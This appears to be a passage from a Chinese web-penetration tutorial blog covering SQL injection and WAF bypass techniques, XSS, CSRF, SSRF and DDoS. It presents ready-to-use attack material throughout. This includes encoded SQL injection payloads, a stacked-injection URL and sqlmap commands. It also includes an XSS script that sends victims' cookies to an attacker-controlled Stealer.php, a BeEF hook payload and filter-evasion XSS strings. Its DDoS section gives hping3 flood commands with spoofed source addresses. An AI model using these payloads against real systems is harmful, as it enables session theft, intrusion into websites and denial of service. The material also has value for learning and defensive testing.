![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708190916943.png)
sqlmap在发送请求数据包中user-agent直接申明自己名号，很多防火墙轻易就将此查杀。

#### 注入插件脚本编写

新建一个发送数据包的txt
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708205251356.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
用sqlmap参数-r执行
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708205302204.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

### 跨域连接

也只有是root权限你才可以去查询数据库名即show schemata ，而前面的show databases()查询的是当前数据库，这不满足我们的需求
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705180515958.png)




### SQL注入常见防御

1. url/?id=MQ== 类似于这样的链接，这样的链接是经过base64编码的，因此你在测试这个网站有没有注入点时，你需要先将id进行解码，然后合并你的注入语句比如id=1 and 1=2 一起经过同等类型的编码；当然也有不少网站为了安全采用了自己的加密算法，这时候你也许就不能找到漏洞了。


**addslashes/magic_quotes_gps=on**
addslashes/magic_quotes_gps=on将会导致：函数返回在预定义字符之前添加反斜杠的字符串。
预定义字符是：
单引号（'）
双引号（"）
反斜杠（\）
NULL

这很好绕过，用hex进行编码后就可以或二次注入或宽字节或双层URL编码

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705184435881.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021070518451262.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705185955596.png)

**判断类型**
这种方法更常见，目前很难被绕过，有人说可以溢出绕过，或者试试2进制，我后续多查查资料再补充一下。![在这里插入图片描述](https://img-blog.csdnimg.cn/2021070519112684.png)
一个网站的防注入通常都是全局配置的，有的参数是应该被允许用字符型的。如果一个个写这种特定过滤会使得代码不美观，有的程序员会因此放弃这种好的写法。但一些点对点红蓝攻击多数会使用这种办法。

**关键字过滤**
比如过滤大小写、select等


**session 进行参数绑定**
利用session防御，session内容正常情况下是用户无法修改的select * from users where user = "'" + session getAttribute("userID") + "'";

### 绕过防御

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705211048981.png)



#### 静态资源

特定的静态资源后缀请求，常见的静态文件(.js、.jpg、.swf、.css等），类似白名单机制，waf为了检测效率，不去检测这样一些静态文件名后缀的请求，因为Waf认为一般图片和文本格式或其他静态脚本都是无害的。
老版本WAF可以这么绕过，现在的不行了
http://10.9.9.201/sql.php?id=1
http://10.9.9.201/sql.php/1.txt?id=1
备注：Aspx/php只识别到前面的.aspx/.php，后面基本不识别。

#### 爬虫白名单

部分waf有提供爬虫白名单的功能，识别爬虫的技术一般有两种：
1.根据UserAgent 
2.通过行为来判断
UserAgent可以很容易欺骗，我们可以伪装成爬虫尝试绕过。这种技术用在ip被封锁，或者频繁扫描请求中
User Agent Switcher (firefox 附加组件)，下载地址：
https://addons.mozilla.org/en-US/firefox/addon/user-agent-switcher/
伪造成百度爬虫
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708170647879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### 版本绕过

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708172007570.png)
union 和select 放一起就会被墙，用以下方法就是安全的
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708172342231.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708172930538.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### 空白

我们可以用来尝试逃避签名检测的第一种方法是利用空白。添加额外的空格或特殊字符（如制表符或换行符）不会影响 SQL 语句，但可能会通过过滤器获取恶意负载。制表符或换行符也不会影响语句

#### 空字节

通常，过滤器会阻止某些字符在 SQL 语句中执行。这可能是阻止攻击的最常见方式，因为如果没有撇号或破折号等特殊字符，注入不太可能成功。

解决此问题的一种方法是在任何被阻止的字符前使用空字节(%00)。例如，如果我们知道应用程序正在阻止撇号，则可以使用以下注入来欺骗过滤器以允许它们：

```bash
%00' or 1=1--
```

#### 网址编码

另一种避免检测的方法是使用 URL 编码。这种类型的编码用于通过 HTTP 通过 Internet发送Web 地址信息。由于 URL 只能包含 ASCII 值，因此任何无效字符都需要编码为有效的 ASCII 字符。URL 也不能包含空格，因此它们通常被转换为 + 号或 %20。通过使用 URL 编码屏蔽恶意 SQL 查询，可以绕过过滤器。以下面的注入为例：

```bash
' or 1=1--
```

使用 URL 编码，它看起来像：

```bash
%27%20or%201%3D1--

```

#### 十六进制编码（HEX）

有助于逃避检测。例如：

```bash
SELECT * FROM Users WHERE name='admin'--
```

十六进制编码的等效项将是：

```bash
SELECT * FROM Users WHERE name=61646D696E--
```

或者，我们可以使用 UNHEX() 函数来实现相同的结果：

```bash
SELECT * FROM Users WHERE name=UNHEX('61646D696E')--

```

#### 字符编码

字符编码的工作方式与十六进制编码类似，因为原始 SQL 语句中的字符被替换为转换后的值。这种类型的编码使用 CHAR() 函数将字符编码为十进制值。
看看下面的查询：

```bash
SELECT * FROM Users WHERE name='admin'--
```

```bash
SELECT * FROM Users WHERE name=CHAR(97,100,109,105,110)--

```

#### 字符串连接

另一种用于绕过过滤器的方法是字符串连接。我们在之前的教程中介绍了字符串连接，但这里也可以应用相同的概念；我们通常可以通过分解恶意 SQL 查询中的关键字来避免检测。请记住，不同的数据库系统之间的字符串连接会有所不同。让我们看看下面的语句：

```bash
SELECT * FROM Users WHERE id=1
```

mysql

```bash
CONCAT('SEL', 'ECT') * FROM Users WHERE id=1

```

PostgreSQL：

```bash
'SEL' || 'ECT' * FROM Users WHERE id=1

```

甲骨文（两个选项）：

```bash
CONCAT('SEL', 'ECT') * FROM Users WHERE id=1

```

```bash
'SEL' || 'ECT' * FROM Users WHERE id=1

```

#### 注释

滥用 SQL 处理内联注释的方式还有助于在执行 SQL 注入攻击时绕过过滤器并避免检测。由于语句中可以有任意数量的注释并且仍然有效，我们可以使用它们来分解查询并可能绕过任何存在的过滤器。例如，我们可以在关键字之间插入注释，如下所示：

```bash
SELECT/**/*/**/FROM/**/Users/**/WHERE/**/name/**/=/**/'admin'--

```

#### 组合

有时，即使是这些签名规避技术本身也不会成功，但我们可以将它们结合起来，以进一步提高我们成功绕过防御并完成攻击的机会。例如，假设我们正在攻击的应用程序上的过滤器不允许使用注释字符。为了解决这个问题，我们可以尝试制作一个对这些字符进行编码的查询，以欺骗过滤器允许它们。失败的原始查询：

```bash
SELECT/**/*/**/FROM/**/Users/**/WHERE/**/name/**/=/**/'admin'--

```

使用 URL 编码屏蔽注释字符的相同查询：

```bash
SELECT%2F%2A%2A%2F%2A%2F%2A%2A%2FFROM%2F%2A%2A%2FUsers%2F%2A%2A%2FWHERE%2F%2A%2A%2Fname%2F%2A%2A%2F%3D%2F%2A%2A%2F%E2%80%99admin%E2%80%99--

```


#### 二次注入

二次注入通常需要利用insert和update，当过滤魔术方法时，insert语句通常会将转义的字符在数据库中自动还原通过再次取出相应的词就可以逃逸魔术方法了。另外如果存在此漏洞还可以进行任意用户的密码修改等。
下图是魔术方法逃逸
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707121240712.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
二次注入危害与sql注入相同，但二次注入要更加的隐蔽。它的存在数量要远小于直接性的SQL注入



**如何发现二次注入**
没有工具，这种漏洞具有一点逻辑层面的感觉。直接用扫描器扫不出来的，基本只能靠人力。
**实例**
注册新用户
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707122604565.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707122623934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
登录进行修改密码界面，把原始密码123456修改成xxxxxx
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707125422301.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
修改完成，查看数据库，修改密码的账号为dhakkan
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021070712550637.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
查看源码
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707125644184.png)


### 注入拓展

#### dnslog带外注入

这个漏洞需要注入的目标是需要当前注入用户拥有最高权限，且有权限进行读写操作。你可能疑惑这个能读写了难道后门不就随便写吗。事实上这个方法是用在你无法写入后门时..解决了盲注不能回显数据，效率低的问题。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707133513883.png)
使用方法就是执行下面语句
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707133521556.png)
其中上面ek0j...是来源于下面这个网站
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707133527305.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
诸如演示脚本演示
工具：https://github.com/ADOOO/DnslogSqlinj
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707140410167.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707140435658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021070714044817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### json格式数据包

有的网站对语句使用json格式传输
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210706111016493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

这在APP中登录或者上传却很常见.这种注入应该将语句写入json中，如图对a进行注入
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210706110730264.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### insert 注入

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210706001251209.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210706001309195.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210706001523973.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### 加密参数

要想自动化测试，就需要对输入的参数进行编码。这里进行了文件中转。再用sqlmap调用这个函数
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707210151862.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707210416830.png)

####  堆叠查询注入

Stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆sql语句(多条)一起执行。而在真实的运用中也是这样的，我们知道在mysql中，主要是命令行中，每一条语句结尾加;表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做stacked injection。
下图展示了堆叠的sql语句是什么样的以及执行结果
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707211416398.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎的不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些数据。比如mysql支持堆叠写法，但是redis等其他数据库是不支持这种写法的

实例：堆叠注入(多语句)

```bash
http://127.0.0.1/sqli-labs/Less-38/?id=1';insert into users(id,username,password) values ('38','less38','hello')--+
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707211527463.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707211534991.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
堆叠注入用处：注入需要管理员账号密码，密码是加密，无法解密，使用堆叠注入进行插入数据，用户密码自定义的，可以正常解密登录。
mtype:会员类别
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707211556997.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### cookie 注入

sqlmap -u "http://www.xx.com/xxx.asp" --cookie "id=XXX cookie" --level 2 ＼
cookie注入 后接cookie值
当网站依靠cookie结果做数据库查询，且不做过多的防护就会存在注入
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705235758892.png)

## xss攻击

xss攻击执行的是javascript脚本，所以xss的执行结果可以通过过滤拦截可以通过源码读取,javascript脚本能执行多强就意味着xss能达到什么样的攻击。只要有数据交互的，数据展示的地方就有可能存在xss攻击比如对你的用户名展示，对你输入的东西展示。比如留言，网站callback等


**常见问题：cookie获取到了却登录不上？**
区别两个术语
cookie 储存本地 存活时间较长 小中型
session 会话 存储服务器 存活时间较短  大型。session就像比如你登录了一次支付宝，过了几分钟不用就还需要你登录。一个session在服务器上会占用1kb，人多了还是挺耗内存的。
对方网站如果只认cookie验证，那么你盗取session是没什么价值的。反过来只认session你盗取cookie做验证也是没有价值的

**常见问题：cookie是空？**
http-only打开了或没登录


**技巧：从phpinfo返回信息获得管理权限**
phpinfo展示界面中拥有cookie值，你获取到这个之后可以访问网站，进行xss操作，如获取源码等
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710150205547.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


### 典型用法

虽然盗取cookie是目前来看最流行的xss应用场景，但是这个触发条件也比较苛刻。攻击成功的条件：对方有漏洞，浏览器存有cookie，浏览器不进行拦截，不存在带代码过滤和httponly，对方要触发这个漏洞地址
cookie还要有意义，如果对方是未登录状态的cookie就索然无味了。一般这种攻击要么就是在肯定对方大概率会查看你的页面时要么就是定向。
典型用法的代码参考与书籍《渗透测试实战》
```python
<script>document.write('<img src="http//<YourIP>/Stealer.php?cookie='%2B document.cookie %2B '"/>');</script>
```
强制下载
```bash
<script>var link = document.createElement('a'); link.href ='http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe'; link.download = '';document.body.appendChild(link); link.click();</script>
```
重定向
```bash
<script>window.location = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";</script>
```

### 工具
#### XSStrike

https://github.com/s0md3v/XSStrike
外国人的项目，自带识别并绕过WAF(由于是外国开发的项目，可能对于中国的一些WAF识别不是很好，但是它的测试仍旧是走对的)所以 如果用在国内的项目探测出WAF：offline不要确定没有WAF。

 - XSStrike主要特点反射和DOM XSS扫描 多线程爬虫 Context分析 可配置的核心 检测和规避WAF 老旧的JS库扫描
   只能payload生成器 手工制作的HTML&JavaScript解析器 强大的fuzzing引擎 盲打XSS支持 高效的工作流
   完整的HTTP支持 Bruteforce payloads支持 Payload编码

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710223335774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210717001905875.png)


#### xss平台

如果你搞的东西比较敏感，不希望别人知道也可以自己搭建一个。目前国内几款xss平台使用规则都差不多，通常总有延迟等问题，不是很好用
自己写类似于如下，一个文件用于触发，另一个文件用于接收。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710003925868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710004151205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)



以下为链接为  https://xsshs.cn 的平台，其他XSS平台使用类似
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210607221344762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
一般选默认，默认是获取cookie。也不要太多模块都勾选，非常非常容易导致JS报错，如果报错，那么可能你就收不到对方的中招信息了。尽量只勾选一个或两个。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210607221517840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
最后XSS平台就会告诉你怎么样执行代码了。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210607221902641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)   



xss获取后台二级密码 – URL跳转 (地址栏不变)    https://woj.app/1820.html

后台(内网)打穿神器→xss蠕虫    https://woj.app/2173.html

xss平台持久cookie说明 keepsession说明    https://woj.app/1907.html

不用cookie 一个储存XSS对“某btc平台”攻城略地  https://woj.app/3035.html








#### beef-xss

打开kali，执行`beef-xss`
命令行启动之后，开启beef终端。默认帐号密码是：beef/beef
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071013163322.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
这时候啥都干不了，是因为你有一步很重要的操作没做。这里需要把payload复制粘贴到你的目标xss的位置，然后将其中的<IP>改成你这台kali的IP地址，最终payload为：<script src="http://X.X.X.X:3000/hook.js"></script>
改完之后，会发现online browers中多了点东西，这时候就可以开始操作了

beef还是很强大的，入侵成功后可以对对方页面进行跳转或者一些社工
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710132101331.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


使用方法就是使用XSS攻击能在页面中插入类似下面的语句就可以了。

```bash
<script src="http://127.0.0.1:3000/hook.js"></script>
```





### 防御与绕过
首先需要寻找可注入的参数，以免你的输入被直接过滤掉了。比如通过查看网页的返回你将能找到某个可注入的参数，xss可能出现在任何地方比如你的ip被回显到界面，比如page参数通常也会回显到界面
开启httponly，输入过滤，输出过滤等


#### httponly

管理员只需要在配置文件中修改一句话就可以开启了。开启后无法通过js脚本读取cookie信息，这能一定程度增加了xss获取cookie的难度，换句话说开启了httponly你的xss后台获取的就是空。但这对其他xss没有过滤效果




#### 绕过方案
**٩( 'ω' )و 手动**

尝试脚本大写
unicode网络编码
多个script嵌套
eval转换
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(2222222222222222) )
不常见函数
```bash
<b onmouseover=alert('XSS')>Click Me!</b>
<svg onload=alert(1)>
<body onload="alert('XSS')">
<img src="http://test.cyberspacekittens.com" onerror=alert(document.cookie);>
```

**工具**
fuzz
https://xssfuzzer.com/fuzzer.html
https://github.com/foospidy/payloads/tree/master/other/xss
https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
新型绕过
http://www.jsfuck.com/

## CSRF
只要受害者在登录状态，点击了一下你的链接，就可以完成攻击。一般你在选取csrf界面时你应该选择可以添加（管理员、用户等）、删除、修改等操作上。如果不能做这些即便有相关漏洞也是没什么危害的。
**危害性**
比xss更大，更难防范。通常可以用来以目标用户的名义发邮件、盗取目标用户账号、购买商品。通常用来做蠕虫攻击、刷SEO流量等。

### 实战

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210711012444131.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

用burpsuite即可快速生成误导链接，我们只需要引导用户去点击这个恶意链接就可以完成攻击
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210512184941253.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071101252633.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210512185302955.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210512185314721.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210512185329497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210512185532760.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)



### 防御

最有效的和简洁的手段是用token，如果你发现对方的网站有token那么你基本就没必要认为对方有csrf漏洞了
由于防御方法简单且难以被绕过，因此现在这种漏洞在大型网站几乎没有，小型网站你要想用此攻击获取普通用户的还是比较好搞，但是要想获取管理员的，你必须知道管理员请求数据包的方式。

>1.当用户发送重要的请求时需要输入原始密码
>2.设置随机Token
>3.检验referer来源，请求时判断请求连接是否为当前管理员正在使用的页面(管理员在编辑文章，黑客发来恶意的修改密码链接，因为修改密码页面管理员并没有在操作，所以攻击失败)
>4.设置验证码
>5.限制请求方式只能为POS
## 待补充：模板注入
模板引擎由于其模块化和简洁的代码与标准 HTML 相比而被更频繁地使用。模板注入是指用户输入直接传递到渲染模板，允许修改底层模板
## SSRF

这个漏洞比CSRF难防范得多，一些大型网站甚至在稍微不注意的时候都会留下这个漏洞。
SSRF 漏洞允许你可以执行以下操作：

> 在回环接口上访问服务
>  扫描内部网络和与这些服务的潜在交互方式GET/POST/HEAD）
>   使用 FILE:// 读取服务器上的本地文件
> 使用 AWS Rest 接口（ http://bit.ly/2ELv5zZ ）
>  横向移动到内部环境中
>  还可以利用其漏洞打穿内网添加管理员或远程下载一个木马

找真实站点搜索关键词：上传网络图片  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210711014602709.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


### 常见攻击
如果对方的网站可以直接链接到别的网站的入口，而本身界面又还是自身网站就可能存在此漏洞

#### 图片上传

图片上传一般允许本地上传（SSRF在本地上传图是没有漏洞的）或者远程上传即访问类似于http://djhsds.img，远程上传的图意味着你访问了这个链接，所以这时候当你将地址换成内部地址时，意味着这个页面会展示很多内部信息。如下请求了一个内网地址端口，这个内网ip通常是要你自己用字典跑的，但是不要紧，内网ip也就这么几百个：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210711020338432.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
除了探测信息以外，你要是发现漏洞了还可以直接执行漏洞代码
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210711024415355.png)
跑完ip再跑端口。
通常你在测试图片上传时会测试以下几种类型的反馈结果
http://对方内网ip/phpmyadmin
dict://对方内网ip:3306/info
ftp://对方内网ip:21


## DDOS 攻击
即分布式拒绝服务（DDoS，Distributed Denial of Service） 攻击。此攻击是通过耗尽目标对象资源来达到攻击效果,攻击类型与扫描方法类似



### DDOS 攻击手段

1）TCP
客户端一直没有给服务器端发送ACK报文，而是一直不断地向服务器端发送连接请求，导致服务端忙于处理批量的连接请求

2）UDP
向目标端口发送大量无用的UDP报文来占满目标的带宽，导致目标服务器瘫痪。
```bash
hping3 --udp  --flood -p 80 --rand-source 想测试的IP
```

3）HTTP
客户端产生大量http访问请求 

4）ICMP
大量ping请求
```bash
hping3 --icmp  --flood -p 80 --rand-source 想测试的IP
```

5)SYN
发送大量无情的SYN包。
如下是攻击代码，在kali中执行
-S 表示发送的是SYN包
–flood 表示以洪水的方式发送，就是拼了命地发
–rand-source 是随机伪造源IP
-p 80 指定端口号为80
```bash
hping3 --syn  --flood -p 80 --rand-source 想测试的IP
```

## 待补充：劫持漏洞
### DNS劫持
DNS 记录指向的资源无效，但记录本身尚未从 DNS 清除，攻击者可以借此实现 DNS 劫持。 
帮助检测DNS工具有：
tko-subs
HostileSubBruteforcer
autoSubTakeover
### HTTP劫持

### DLL劫持

# 绕过检测
你虽然总希望一开始就万剑闪过的绕过防御，但你总不是这么幸运的，通常要不断的尝试。在内网渗透时有时候你还可以故意用一个出名的如Mimikatz来留下痕迹，进而开始触发报警，蓝队在发现我们使用的默认/基础恶意软件（或者仅仅进行了轻微的混淆）时就会将此视为胜利，但我们的真正目的是了解他们的环境。
## 待补充：免杀
## WAF绕过

很多web都有WAF，会对恶意访问者做一定的拦截和记录。你在测试你的危险语句时，遭遇waf第一步是不要惊慌，一点一点的测试是因为匹配到了语句中的哪个词组或符号组被拦截了。
在学习WAF绕过时，最深度学习的方式是将想分析的WAF下载到电脑，弄一个网站，开着WAF自己跟自己玩。


**waf类型**

硬件、软件、云
**waf检测工具**

1. wafw00f
3. sqlmap
   相较于手工和wafw00f而言，sqlmap业界认可度更高，用的人更多

```bash
sqlmap.py -u "url" --identify-waf --batch
```


**简单概述WAF绕过**
WAF绕过将会更难了，这些绕过都是有条件的。

1.扫描速度（代理池，延迟，白名单）
2.工具指纹（特征指纹，伪造模拟真实是用户）
3.漏洞payload（数据变异，数据加密，白名单）
	碰到WAF多换几个工具
	代理发送burpsuite，鼠标点击器扫

#### 市面上WAF

受欢迎的 WAF 供应商       
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210716181640870.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

##### 阿里云盾

买阿里云就有阿里云盾默认开启。WAF收费版只是有自定义的不同，功能上都差不多。阿里云检测苛刻，稍微不注意就暂时被封了，比如扫目录会被封一个小时样子。

##### 宝塔

一般非法网站都会用宝塔一站式搭建，所以一般这类网站就是宝塔防护。绕过难度：难
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707225447286.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
